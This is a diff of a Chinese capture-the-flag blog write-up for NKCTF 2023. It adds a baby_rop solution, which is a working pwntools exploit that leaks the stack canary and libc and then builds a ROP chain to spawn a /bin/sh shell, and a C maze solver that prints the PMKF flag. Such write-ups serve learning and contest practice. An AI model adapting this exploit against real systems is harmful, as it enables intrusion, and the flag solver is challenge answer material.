@@ -385,14 +385,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    2.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    11 分
                 </div>
                 
 
@@ -774,7 +774,166 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 
 
 
-<h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><h2 id="baby-heap（待复现）"><a href="#baby-heap（待复现）" class="headerlink" title="baby_heap（待复现）"></a>baby_heap（待复现）</h2><h2 id="note（待复现）"><a href="#note（待复现）" class="headerlink" title="note（待复现）"></a>note（待复现）</h2>
+<h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><ul>
+<li>格式化字符串泄漏canary</li>
+<li>my_read存在off by null漏洞，可以覆盖rbp低字节为0</li>
+<li>call vuln后有一个leave，而vuln自己也有leave;ret；所以这里两次leave 存在栈迁移；但这里栈迁移是随机的，它会迁移到更低的栈地址，所以看运气了；我们在payload前面布置ret，让它往下滑</li>
+</ul>
+<blockquote>
+<p>先泄漏libc</p>
+<p>然后rop就行，</p>
+</blockquote>
+<p><img src="/2023/04/22/nkctf2023-wp/4.png"></p>
+<p><img src="/2023/04/22/nkctf2023-wp/5.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./pwn"</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401413</span>
+ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>
+main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
+vuln <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+    <span class="token comment">#泄漏canary</span>
+    payload <span class="token operator">=</span> <span class="token string">b"%41$p"</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Hello, '</span><span class="token punctuation">)</span>
+    canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'canary:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment">#泄漏libc</span>
+    leak <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">27</span> <span class="token operator">+</span> leak <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'NKCTF: \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'carefully.\n'</span><span class="token punctuation">)</span>
+    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'pust_addr:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+    binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment">#泄漏canary</span>
+    payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Hello, '</span><span class="token punctuation">)</span>
+    canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'canary:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment">#get shell</span>
+    shell <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">28</span> <span class="token operator">+</span> shell <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
+    
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'NKCTF: \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="baby-heap（待复现）"><a href="#baby-heap（待复现）" class="headerlink" title="baby_heap（待复现）"></a>baby_heap（待复现）</h2><h2 id="note（待复现）"><a href="#note（待复现）" class="headerlink" title="note（待复现）"></a>note（待复现）</h2><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ez-baby-apk（待复现）"><a href="#ez-baby-apk（待复现）" class="headerlink" title="ez_baby_apk（待复现）"></a>ez_baby_apk（待复现）</h2><h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><ul>
+<li>迷宫题，没啥好说的；只是它把一个字节的每两位当做一步，并且异或的时候只是取的低字节</li>
+</ul>
+<blockquote>
+<p>要多注意变量的类型，是一个字节还是两个字节等待&gt;_&lt;</p>
+</blockquote>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"crypt.h"</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;Windows.h&gt;</span></span>
+
+<span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'N'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'K'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'.'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span>
+					  <span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span><span class="token punctuation">,</span><span class="token char">'*'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> dir<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> path<span class="token punctuation">[</span><span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+bool visited<span class="token punctuation">[</span><span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> false <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+bool <span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> l <span class="token operator">&gt;=</span> <span class="token number">11</span> <span class="token operator">*</span> <span class="token number">18</span> <span class="token operator">||</span> map<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span> false<span class="token punctuation">;</span>
+	<span class="token keyword">else</span>
+		<span class="token keyword">return</span> true<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> path<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'K'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+			<span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>path<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			ans<span class="token punctuation">[</span>i <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>
+			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x "</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			i <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token keyword">return</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">int</span> tmp <span class="token operator">=</span> l <span class="token operator">+</span> dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>visited<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+			visited<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> true<span class="token punctuation">;</span>
+			path<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
+			<span class="token function">dfs</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> path<span class="token punctuation">,</span> len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			visited<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> false<span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+	<span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> head <span class="token operator">=</span> <span class="token string">"5nkman"</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	
+	<span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		sum <span class="token operator">+=</span> head<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%d"</span><span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nnkctf{05"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> head<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>sum<span class="token punctuation">;</span>
+		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
